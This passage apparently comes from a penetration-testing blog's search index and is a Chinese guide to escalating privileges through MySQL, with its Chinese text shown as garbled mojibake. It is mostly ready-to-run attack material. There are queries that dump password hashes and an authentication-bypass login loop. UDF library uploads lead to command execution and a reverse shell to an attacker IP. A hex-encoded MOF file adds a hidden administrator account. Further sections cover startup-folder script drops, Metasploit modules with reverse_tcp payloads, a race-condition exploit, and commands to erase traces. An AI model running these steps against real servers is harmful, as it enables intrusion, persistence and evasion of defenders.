æ–‡ä»¶è™½ç„¶å¯ä»¥å†™å…¥ï¼Œä½†æ˜¯è¯¥æ–‡ä»¶çš„æƒé™æ˜¯ MySQL åˆ›å»ºçš„ ï¼š -rw-rw---- 1 mysql mysql 293 Feb 19 10:29 shell.php è®¿é—®è¿™ä¸ª php æ–‡ä»¶ä¼šå‡ºç° HTTP 500 çš„çŠ¶æ€ç ï¼Œç»“è®ºæ˜¯ Linux ç³»ç»Ÿè¿™ç§æƒ…å†µåŸºæœ¬ä¸Šä¸ä¼šæˆåŠŸï¼Œåªæœ‰åœ¨ Windows ç³»ç»Ÿä¸‹æˆåŠŸç‡ä¼šé«˜ä¸€äº›ã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.3 Hash ç ´è§£ å‡è®¾å­˜åœ¨ SQL æ³¨å…¥ DBA æƒé™ï¼Œå¦‚æœç›®æ ‡ 3306 ç«¯å£ä¹Ÿæ˜¯å¯ä»¥è®¿é—®é€šçš„è¯ï¼Œå¯ä»¥å°è¯•è¯»å– MySQL çš„ Hash æ¥è§£å¯†ï¼š # MySQL \u003c= 5.6 ç‰ˆæœ¬ mysql\u003e select host, user, password from mysql.user; # MySQL \u003e= 5.7 ç‰ˆæœ¬ mysql \u003e select host,user,authentication_string from mysql.user; ä¹‹åå¯ä»¥é€šè¿‡åœ¨çº¿ç•Œé¢ç½‘ç«™è§£å¯†ã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.4 MySQL 1Day æ¼æ´ 1.4.1 yaSSL ç¼“å†²åŒºæº¢å‡º MSF é‡Œé¢å·²ç»é›†æˆå¥½äº†å¯¹åº”çš„æ¨¡å—ï¼š msf6 \u003e use exploit/windows/mysql/mysql_yassl_hello msf6 \u003e use exploit/linux/mysql/mysql_yassl_hello 1.4.2 CVE-2012-2122 çŸ¥é“ç”¨æˆ·åå¤šæ¬¡è¾“å…¥é”™è¯¯çš„å¯†ç ä¼šæœ‰å‡ ç‡å¯ä»¥ç›´æ¥æˆåŠŸç™»é™†è¿›æ•°æ®åº“ï¼Œå¯ä»¥å¾ªç¯ 1000 æ¬¡ç™»é™†æ•°æ®åº“ï¼š for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done åœ¨ MSF ä¸­æœ‰å¯¹åº”çš„åˆ©ç”¨æ¨¡å—ï¼š msf6 \u003e use auxiliary/scanner/mysql/mysql_authbypass_hashdump ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2 UDF ææƒ User Defined Function - è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version() ç­‰æ–¹ä¾¿ã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.1 æ‰‹åŠ¨å®ç° 2.1.1 åŠ¨æ€é“¾æ¥åº“ å¦‚æœæ˜¯ MySQL \u003e= 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\\plugin æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚ sqlmap ä¸­çš„åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼š /path/to/sqlmap/data/udf/mysql sqlmap ä¸­ è‡ªå¸¦è¿™äº›åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡ç¼–ç å¤„ç†è¿‡ï¼Œä¸èƒ½è¢«ç›´æ¥ä½¿ç”¨ã€‚ä¸è¿‡å¯ä»¥åˆ©ç”¨ sqlmap è‡ªå¸¦çš„è§£ç å·¥å…·cloak.py æ¥è§£ç ä½¿ç”¨ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å‚è€ƒã€ŒSQL æ³¨å…¥ç›¸å…³ã€æ–‡ç« ã€‚ msf ä¸­çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š /path/to/msf/embedded/framework/data/exploits/mysql 2.1.2 æ’ä»¶ç›®å½•å­˜æ”¾ä½ç½® é€šè¿‡å¦‚ä¸‹ SQL è¯­å¥æ¥å®ç°ï¼š mysql\u003e show variables like '%plugin%'; +---------------+------------------------------+ | Variable_name | Value | +---------------+------------------------------+ | plugin_dir | /usr/local/mysql/lib/plugin/ | +---------------+------------------------------+ æŠ€å·§ åœ¨ windows ä¸‹å¯ä»¥åˆ©ç”¨ NTFS æµæ¥åˆ›å»ºè¯¥æ–‡ä»¶å¤¹ï¼š select 233 into dumpfile 'C:\\\\PhpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$index_allocation'; æŠ€å·§ å¦‚ä½•æ‰¾åˆ° mysql çš„å®‰è£…ç›®å½•ï¼š mysql\u003e select @@basedir; +------------------+ | @@basedir | +------------------+ | /usr/local/mysql | +------------------+ 2.1.3 å†™å…¥åŠ¨æ€é“¾æ¥åº“ SQL æ³¨å…¥ä¸”æ˜¯é«˜æƒé™ï¼Œplugin ç›®å½•å¯å†™ä¸”éœ€è¦ secure_file_priv æ— é™åˆ¶ï¼ŒMySQL æ’ä»¶ç›®å½•å¯ä»¥è¢« MySQL ç”¨æˆ·å†™å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ sqlmap æ¥ä¸Šä¼ åŠ¨æ€é“¾æ¥åº“ï¼Œåˆå› ä¸º GET æœ‰å­—èŠ‚é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥å¾€å¾€ POST æ³¨å…¥æ‰å¯ä»¥æ‰§è¡Œè¿™ç§æ”»å‡»ã€‚ sqlmap -u \"http://localhost/\" --data=\"id=1\" --file-write=\"/path/to/lib_mysqludf_sys_64.so\" --file-dest=\"/usr/lib/mysql/plugin/udf.so\" å¦‚æœæ²¡æœ‰æ³¨å…¥çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥æ“ä½œåŸç”Ÿ SQL è¯­å¥ï¼Œè¿™ç§æƒ…å†µä¸‹å½“ secure_file_priv æ— é™åˆ¶çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡æ‰‹å·¥å†™æ–‡ä»¶åˆ° plugin ç›®å½•ä¸‹çš„ï¼š # ç›´æ¥ SELECT æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥ SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; è¿™é‡Œçš„åå…­è¿›åˆ¶æ€ä¹ˆè·å–å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ MySQL è‡ªå¸¦çš„ hex å‡½æ•°æ¥ç¼–ç ï¼š # ç›´æ¥ä¼ å…¥è·¯å¾„ç¼–ç  SELECT hex(load_file('/lib_mysqludf_sys_64.so')); # ä¹Ÿå¯ä»¥å°†è·¯å¾„ hex ç¼–ç  SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)); 2.1.4 å‘½ä»¤æ‰§è¡Œ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; select sys_eval('whoami'); 2.1.5 æ¸…ç†ç—•è¿¹ åˆ é™¤è‡ªå®šä¹‰å‡½æ•°ï¼š drop function sys_eval; ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.2 è‡ªåŠ¨åŒ–å®ç° msf ä¸­çš„æ¨¡å—ï¼š msf6 \u003e set payload linux/x86/shell/bind_tcp ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.3 UDF Shell å‡è®¾ç›®æ ‡ MySQL åœ¨å†…ç½‘æƒ…å†µä¸‹ï¼Œæ— æ³•ç›´è¿ MySQL æˆ–è€… MySQL ä¸å…è®¸å¤–è¿ï¼Œè¿™ä¸ªæ—¶å€™ä¸€äº›ç½‘é¡µè„šæœ¬å°±æ¯”è¾ƒæ–¹ä¾¿å¥½ç”¨äº†ã€‚ 2.3.1 UDF.PHP UDF å‘½ä»¤æ‰§è¡Œå¤§é©¬ï¼šhttps://github.com/echohun/tools/blob/master/å¤§é©¬/udf.php 2.3.2 Navicat MySQL ç›®æ ‡ MySQL ä¸å…è®¸å¤–è¿ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ Navicat è‡ªå¸¦çš„ tunnel éš§é“è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡ç½‘ç«™ä¸Šï¼š æ¥ç€è¿æ¥çš„æ—¶å€™è®¾ç½® HTTP é€šé“ï¼š è¿æ¥æˆåŠŸåå°±å¯ä»¥è¿›è¡Œä¸Šè¿°æ‰‹å·¥ UDF ææƒæ­¥éª¤ã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.4 åå¼¹ç«¯å£ææƒ å®é™…ä¸Šè¿™æ˜¯ UDF ææƒçš„å¦ä¸€ç§ç”¨æ³•ï¼Œåªæ˜¯è¿™é‡Œçš„åŠ¨æ€é“¾æ¥åº“è¢«å®šåˆ¶è¿‡çš„ï¼ŒåŠŸèƒ½æ›´å¤šæ›´å®ç”¨ä¸€äº›ï¼š cmdshell # æ‰§è¡Œcmd downloader # ä¸‹è½½è€…,åˆ°ç½‘ä¸Šä¸‹è½½æŒ‡å®šæ–‡ä»¶å¹¶ä¿å­˜åˆ°æŒ‡å®šç›®å½• open3389 # é€šç”¨å¼€3389ç»ˆç«¯æœåŠ¡,å¯æŒ‡å®šç«¯å£(ä¸æ”¹ç«¯å£æ— éœ€é‡å¯) backshell # åå¼¹Shell ProcessView # æšä¸¾ç³»ç»Ÿè¿›ç¨‹ KillProcess # ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹ regread # è¯»æ³¨å†Œè¡¨ regwrite # å†™æ³¨å†Œè¡¨ shut # å…³æœº,æ³¨é”€,é‡å¯ about # è¯´æ˜ä¸å¸®åŠ©å‡½æ•° åœ°å€ï¼šhttps://github.com/Geekby/langouster_udf é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šå¼€å¯ NC ç›‘å¬ï¼Œç„¶åç›®æ ‡æœºå™¨ä¸Šå¯¼å…¥ dll åŠ¨æ€é“¾æ¥åº“ï¼Œç„¶ååˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼š CREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll'; ç›´æ¥åå¼¹ shell ï¼š select backshell(\"IP\", 4444); ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3 MOF ææƒ MOF ææƒæ˜¯ä¸€ä¸ªæœ‰å†å²çš„æ¼æ´ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.1 åŸç† ææƒçš„åŸç†æ˜¯ C:/Windows/system32/wbem/mof/ ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.2 æ‰‹åŠ¨å¤ç° 3.2.1 ä¸Šä¼  mof æ–‡ä»¶ #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; åˆ©ç”¨ MySQL å†™æ–‡ä»¶çš„ç‰¹æ€§å°†è¿™ä¸ª MOF æ–‡ä»¶å¯¼å…¥åˆ° C:/Windows/system32/wbem/mof/ ç›®å½•ä¸‹ï¼Œä¾ç„¶é‡‡ç”¨ä¸Šè¿°ç¼–ç çš„æ–¹å¼ï¼š select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile \"C:/windows/system32/wbem/mof/test.mof\"; 3.2.2 ç—•è¿¹æ¸…ç† å› ä¸ºæ¯éš”å‡ åˆ†é’Ÿæ—¶é—´åˆä¼šé‡æ–°æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ‰€ä»¥æƒ³è¦æ¸…ç†ç—•è¿¹å¾—å…ˆæš‚æ—¶å…³é—­ winmgmt æœåŠ¡å†åˆ é™¤ç›¸å…³ mof æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å†åˆ é™¤ç”¨æˆ·æ‰ä¼šæœ‰æ•ˆæœï¼š # åœæ­¢ winmgmt æœåŠ¡ net stop winmgmt # åˆ é™¤ Repository æ–‡ä»¶å¤¹ rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\ # æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶ del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S # åˆ é™¤åˆ›å»ºçš„ç”¨æˆ· net user hacker /delete # é‡æ–°å¯åŠ¨æœåŠ¡ net start winmgmt ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.3 è‡ªåŠ¨åŒ–å®ç° MSF é‡Œé¢è‡ªå¸¦äº† MOF ææƒæ¨¡å—ï¼š msf6 \u003e use exploit/windows/mysql/mysql_mof # è®¾ç½®å¥½è‡ªå·±çš„ payload msf6 \u003e set payload windows/meterpreter/reverse_tcp # è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯ msf6 \u003e set rhosts 192.168.102.1 msf6 \u003e set username root msf6 \u003e set password root msf6 \u003e run ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4 å¯åŠ¨é¡¹ææƒ è¿™ç§ææƒä¹Ÿå¸¸è§äº Windows ç¯å¢ƒä¸‹ï¼Œå½“ Windows çš„å¯åŠ¨é¡¹å¯ä»¥è¢« MySQL å†™å…¥çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ MySQL å°†è‡ªå®šä¹‰è„šæœ¬å¯¼å…¥åˆ°å¯åŠ¨é¡¹ä¸­ï¼Œè¿™ä¸ªè„šæœ¬ä¼šåœ¨ç”¨æˆ·ç™»å½•ã€å¼€æœºã€å…³æœºçš„æ—¶å€™è‡ªåŠ¨è¿è¡Œã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.1 å¯åŠ¨é¡¹è·¯å¾„ Windows Server 2003 çš„å¯åŠ¨é¡¹è·¯å¾„ï¼š # ä¸­æ–‡ç³»ç»Ÿ C:\\Documents and Settings\\Administrator\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨ C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨ # è‹±æ–‡ç³»ç»Ÿ C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup # å¼€å…³æœºé¡¹ éœ€è¦è‡ªå·±å»ºç«‹å¯¹åº”æ–‡ä»¶å¤¹ C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Startup C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Shutdown Windows Server 2008 çš„å¯åŠ¨é¡¹è·¯å¾„ï¼š C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.2 å†™å…¥æ–‡ä»¶ select 0x... into dumpfile \"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\test.vbs\"; å†™å…¥æˆåŠŸçš„æ—¶å€™å°±ç­‰å¾…ç³»ç»Ÿç”¨æˆ·é‡æ–°ç™»å½•ï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œæˆ‘ä»¬çš„è‡ªå®šä¹‰è„šæœ¬ä¹Ÿå°±ä¼šè¢«æ‰§è¡Œã€‚ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.2 MSF è‡ªåŠ¨åŒ–å®ç° msf6 \u003e use exploit/windows/mysql/mysql_start_up ä¿¡æ¯ STARTUP_FOLDER å¯åŠ¨é¡¹æ–‡ä»¶å¤¹å¾—è‡ªå·±æ ¹æ®å®é™…çš„ç›®æ ‡ç³»ç»Ÿæ¥è¿›è¡Œè°ƒæ•´ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4 CVE-2016-6663 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.1 åŸç† ç«äº‰æ¡ä»¶ææƒæ¼æ´ï¼Œä¸€ä¸ªæ‹¥æœ‰ CREATE/INSERT/SELECT ä½æƒé™çš„è´¦æˆ·ææƒæˆåŠŸåå¯ä»¥ç³»ç»Ÿç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„ä»£ç ï¼Œææƒçš„ç”¨æˆ·ä¸º mysql ç”¨æˆ·ï¼Œæ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯å°†ä½æƒé™çš„ www-data æƒé™æå‡ä¸º mysql æƒé™ æ¡ä»¶ï¼š Getshell æ‹¿åˆ° www-data æƒé™ æ‹¿åˆ° CREATE/INSERT/SELECT ä½æƒé™çš„ MySQL è´¦æˆ· å…³é”®æå–æ­¥éª¤éœ€è¦åœ¨äº¤äº’ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥éœ€è¦åå¼¹ shell MySQL ç‰ˆæœ¬éœ€è¦ \u003c= 5.5.51 æˆ– 5.6.x \u003c= 5.6.32 æˆ– 5.7.x \u003c= 5.7.14 æˆ– 8.x \u003c 8.0.1 MariaDB ç‰ˆæœ¬éœ€è¦ \u003c= 5.5.51 æˆ– 10.0.x \u003c= 10.0.27 æˆ– 10.1.x \u003c= 10.1.17 Expï¼šhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html åœ¨åå¼¹çš„ shell ä¸­ï¼Œç¼–è¯‘ payloadï¼š gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient æ‰§è¡Œ EXP ææƒï¼š # ./mysql-privesc-race æ•°æ®åº“ç”¨æˆ·å å¯†ç  æ•°æ®åº“åœ°å€ æ•°æ®åº“ ./mysql-privesc-race test 123456 localhost test å‚è€ƒï¼š http://next.uuzdaisuki.com/2018/07/02/mysqlæ•°æ®åº“ææƒæ€»ç»“/ https://www.sqlsec.com/2020/11/mysql.html https://xz.aliyun.com/t/1122 https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7\u0026spm=1001.2101.3001.4242 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ 